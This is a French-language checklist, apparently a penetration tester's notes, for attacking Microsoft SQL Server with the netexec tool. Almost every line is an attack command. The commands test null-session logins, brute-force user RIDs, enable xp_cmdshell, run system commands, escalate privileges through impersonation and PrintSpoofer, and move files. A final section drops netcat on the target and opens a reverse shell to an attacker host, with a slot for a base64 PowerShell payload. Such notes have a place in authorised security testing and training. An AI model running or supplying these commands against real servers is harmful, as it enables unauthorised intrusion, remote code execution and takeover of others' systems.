# **MSSQL Enumeration & Exploitation Checklist**  

## 🔍 Enumération & Connexion  
```bash
# Tester l'accès (y compris en null session)
netexec mssql $IP -u '' -p ''
netexec mssql $IP -u '$DOMAIN\$USER' -p '$PASSWORD'

# Découvrir les utilisateurs via RID bruteforce
nxc mssql $IP -u $USER -p '$PASSWORD' --rid-brute

# Lister les bases de données
netexec mssql $IP -u '$DOMAIN\$USER' -p '$PASSWORD' -q "SELECT name FROM sys.databases"
```

## 🔓 Privilèges & Exécution de commandes  
```bash
# Activer xp_cmdshell
netexec mssql $IP -u '$DOMAIN\$USER' -p '$PASSWORD' --enable-xp-cmdshell

# Exécuter une commande via xp_cmdshell
netexec mssql $IP -u '$DOMAIN\$USER' -p '$PASSWORD' -x "whoami /all"

# Vérifier les élévations de privilèges possibles
netexec mssql $IP -u $USER -p '$PASSWORD' -M mssql_priv

# Vérifier les permissions d'usurpation d'identité (impersonation)
netexec mssql $IP -u $USER -p '$PASSWORD' -M mssql_priv -o ACTION=privesc
```

## 📂 Transfert de fichiers  
```bash
# Envoyer un fichier vers la cible
nxc mssql $IP -u $USER -p '$PASSWORD' --put-file /tmp/local_file C:\\Windows\\Temp\\remote_file.txt

# Télécharger un fichier depuis la cible
nxc mssql $IP -u $USER -p '$PASSWORD' --get-file C:\\Windows\\Temp\\remote_file.txt /tmp/local_file
```

## 🚀 Reverse Shell  
```bash
# Déposer netcat sur la cible
nxc mssql $IP -u $USER -p '$PASSWORD' --put-file nc.exe

# Lancer un reverse shell via netcat
nxc mssql $IP -u $USER -p '$PASSWORD' -x "C:\Windows\Temp\nc.exe $ATTACKER_IP 1234 -e cmd"

# Si whoami montre un token d'impersonation -> exploit PrintSpoofer
nxc mssql $IP -u $USER -p '$PASSWORD' -x 'C:\Windows\Temp\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe $ATTACKER_IP 1234 -e cmd"'

# Reverse Shell sur Active Directory (Base64 PowerShell)
nxc mssql $IP -u '' -p '' -x '<PAYLOAD REVERSE SHELL BASE64 HERE>'
```